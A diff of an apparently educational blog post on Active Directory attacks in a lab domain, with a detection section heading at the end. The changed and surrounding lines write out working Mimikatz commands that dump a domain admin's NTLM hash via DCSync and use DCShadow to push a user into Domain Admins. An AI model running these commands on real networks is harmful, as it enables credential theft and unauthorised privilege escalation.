@@ -62,8 +62,9 @@ Onto the Attack:
 <li><p><strong>domain groups “domain admins” /domain</strong></p></li>
 </ul>
 <p>See that “vision” is a user in the DA group. This could be a good target. To grap the user’s ntlm hash, this command can be ran inside of <a href="https://github.com/gentilkiwi/mimikatz"><strong>Mimikatz</strong></a>:</p>
+
+<p><strong><i> Open Mimikatz Console </i></strong></p>
 <ul>
-<li><p><strong><i> Open Mimikatz Console </i></strong></li>
 <li><p><strong>lsadump::dcsync /domain:windomain.local /user:vision</strong></p></li>
 </ul>
 <p>Users ntlm hash:</p>
@@ -83,30 +84,31 @@ Onto the Attack:
 <p>As shown in the video, the user logged in is: vision@windomain.local (member of the Domain Administrator’s Group). The adversary wants to evade any detection or hunting that is currently being done due to logs that have propagated (which I show below). Great way to do so is to inject a user into the DA Group, then use that user. Say there was a user in the domain named: thanos@windomain.local. Sounds like a perfect fit, since historically Vision practically gave Thanos the last infinity stone, making him all powerful.</p>
 <p>I want to point out, that in this attack we are modifying two things. Firstly, the computers (win10.windomain.local) attribute to classify as a Global Catalog (GC- a role given to one or more Domain Controllers in the environment so that it can store data about every object in the forest). This allows the computer to be a rogue Domain Controller and push out modifications to objects to the legitimate Domain Controller. Secondly, we are modifying Thanos’ privileges to give him DA rights.</p>
 <p>How do can this be done? By running these commands inside of <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>:</p>
+
+<p><strong><i> Open Mimikatz Console </i></strong></p>
 <ul>
-  
-<li><p><strong><i> Open Mimikatz Console </i></strong></li>
-  
 <li><p><strong>!+</strong> (Registers and starts a service with SYSTEM level privileges)</p></li>
 
 <li><p><strong>!processtoken</strong> (Gives the System Token to Mimikatz so it has the appropriate privileges to run the following commands)</p></li>
 
 <li><p><strong>lsadump::dcshadow /object:thanos /attribute:primaryGroupID /value:512</strong> (This will will use the Security Identifier (512) of the DA Group to inject thanos into the DA Group.</p></li>
-
-<li><p><strong><i> Open a Second Mimikatz Console </i></strong></li>
-
+</ul>
+<p><strong><i> Open a second Mimikatz Console </i></strong></p>
+<ul>
 <li><p><strong>lsadump::dcshadow /push</strong> (Pushes the changes we made with the rogue Domain Controller (us) to the actual Domain Controller).</p></li>
 </ul>
-
 <p>Thanos has now been injected into the DA Group, this can be verified by:</p>
-
 <ul>
 <li><p><strong>domain group “domain admins” /domain</strong></p></li>
 </ul>
 
+**Note** You could have two seperate Mimikatz Consoles opened at the same time to run this attack. Commands are the same, but before the <i> lsadump::dcshadow /push </i> you would need to run <i> privilege::debug </i> to give the subprocess SYSTEM level privileges.
+
+
+
 ![thanos](/images/DCSync-vs-DCShadow/thanos-gif.gif)
 
-**Note** You could have two seperate Mimikatz Consoles opened at the same time to run this attack. Commands are the same, but before the <i> lsadump::dcshadow /push </i> you would need to run <i> privilege::debug </i> to give the subprocess SYSTEM level privileges.
+
 
 Onto the Hunt (the best part):
 ---
